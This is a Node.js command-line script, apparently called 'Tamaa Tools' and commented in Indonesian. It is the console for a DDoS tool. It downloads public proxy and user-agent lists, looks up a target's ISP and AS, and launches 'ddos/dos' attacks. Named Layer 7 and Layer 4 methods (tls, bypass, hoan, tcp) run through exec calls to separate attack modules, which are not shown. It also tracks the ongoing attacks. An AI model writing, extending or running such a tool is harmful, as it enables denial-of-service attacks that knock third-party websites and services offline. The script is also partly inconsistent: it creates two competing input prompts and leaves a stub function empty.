#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const blue = '\x1b[34m';
const reset = '\x1b[0m';
const green = '\x1b[32m';
const yellow = '\x1b[33m';
const red = '\x1b[31m';
const white = '\x1b[37m';
const black = '\x1b[40m';
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
  console.clear();
  console.log(`
${yellow}┏━┳━━━━━━━━┓${reset}    ${red}▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬${reset}
${yellow}┃◯┃╭┻┻╮╭┻┻╮┃${reset}     
${yellow}┃╮┃┃╭╮┃┃╭╮┃┃${reset}                   𝙏 𝙤 𝙤 𝙡 𝙨
${yellow}┃╯┃┗┻┻┛┗┻┻┻┻╮${reset}  𝙎 𝙤 𝙣 𝙜 𝙚 𝘽 𝙤 𝙗  𝚇 𝙏 𝙖 𝙢 𝙖 𝙖
${yellow}┃◯┃╭╮╰╯┏━━━┳╯${reset}   
${yellow}┃╭┃╰┏┳┳┳┳┓◯┃${reset}    ${red}▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬${reset}
 ${white}=================================================${reset}`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('Tamaa.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('Tamaaa.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('Tamaa.txt')) {
    fs.unlinkSync('Tamaa.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('Tamaaa.txt')) {
    fs.unlinkSync('Tamaaa.txt');
  }
}
// [========================================] //
const correctPassword = '1'; // Ganti dengan password yang Anda inginkan

// Setup antarmuka readline untuk input dari terminal
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Fungsi untuk meminta password
rl.question('Masukkan password untuk mengakses tool: ', (inputPassword) => {
  if (inputPassword === correctPassword) {
    console.log('Password benar! Tool dijalankan...');
    // Tempatkan logika atau perintah tool yang ingin dijalankan di sini
    runTool();
  } else {
    console.log('Password salah. Akses ditolak.');
  }
  rl.close(); // Menutup antarmuka readline setelah selesai
});

// Fungsi untuk menjalankan tool Anda
function runTool() {
  console.log('Tool sedang dijalankan...');
  // Ganti dengan logika atau tools yang Anda inginkan
}
//============================================
async function bootup() {
  try {
    await exec(`npm i axios net http2 tls cluster url path crypto user-agents fake-useragent fs https`);
    await scrapeProxy();
    await scrapeUserAgent();
    await sleep(5000);
    console.clear();
    console.log(`

_________________________________________________________
                ${green}Welcome To Tamaa Tools${reset}
                [ Loading............. ]
`);
    await sleep(9000);
    await banner();
    console.log(`\x1b[1m\x1b[32mType 'list' For Showing All Available Commands${reset}`);
    sigma();

  } catch (error) {
    console.log("Are You Online?");
  }
}
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 10000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 Tamaa`);
    sigma();
	return
  }
const [target, duration, methods, port] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
${yellow}┏━┳━━━━━━━━┓${reset} ${green}Target ${reset}  : \x1b[1m\x1b[32m${target}
${yellow}┃◯┃╭┻┻╮╭┻┻╮┃${reset} ${green}Duration ${reset}: \x1b[1m\x1b[32m${duration}
${yellow}┃╮┃┃╭╮┃┃╭╮┃┃${reset} ${green}Methods ${reset} : \x1b[1m\x1b[32m${methods}
${yellow}┃╯┃┗┻┻┛┗┻┻┻┻╮${reset} ${green}ISP ${reset}    : \x1b[1m\x1b[32m${result.isp}
${yellow}┃◯┃╭╮╰╯┏━━━┳╯${reset} ${green}Ip ${reset}     : \x1b[1m\x1b[32m${result.query}
${yellow}┃╭┃╰┏┳┳┳┳┓◯┃${reset} ${green}AS ${reset}      : \x1b[1m\x1b[32m${result.as}
      
${white}I don't have a team, I want to have a theme ${reset}
                      ${red}Attack Has Been Launched ${reset}
${white}===============================================${reset}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `./lib/${methods}`);
  if (methods === 'tls') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10`)
	sigma()
	} else if (methods === 'bypass') {
		pushOngoing(target, methods, duration) 
		exec(`node ${metode} ${target} ${duration} 100 10 Tamaa.txt`)
		sigma()
	} else if (methods === 'tcp') {
		pushOngoing(target, methods, duration) 
		exec(`node ${metode} ${target} ${duration} ${port}`)
		sigma()
    } else if (methods === 'hoan') {
		pushOngoing(target, methods, duration) 
		exec(`node ${metode} ${target} ${duration} 15 Tamaa.txt`)
		sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = ``
permen.question(`${yellow}[ 𝘾 𝙤 𝙣 𝙨 𝙤 𝙡 𝙚 => ] ${reset}: \n\n`, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'list') {
    console.log(`
━━━━━━━━━━━━━━━━━━━━━━━━━
| methods      | Show list of available methods
| attack       | Launch ddos/dos attack
| ongoing      | show ongoing attack
| clear        | clear terminal
━━━━━━━━━━━━━━━━━━━━━━━━━
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[=========================================]
|| METHODS  || INFORMATION || Layer <!> ||
[ ! ]━━━━━━━━━━━━━━━━━━━━━━━━━[ ! ]
|| bypass   || Bypass-<!> || Layer 7 ||
|| tls      || Tls V×     || Layer 7 ||
|| hoan     || HOAN-V2    || Layer 7 ||
|| tcp      ||  TCP <^>   || Layer 4 ||
[=========================================]
`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()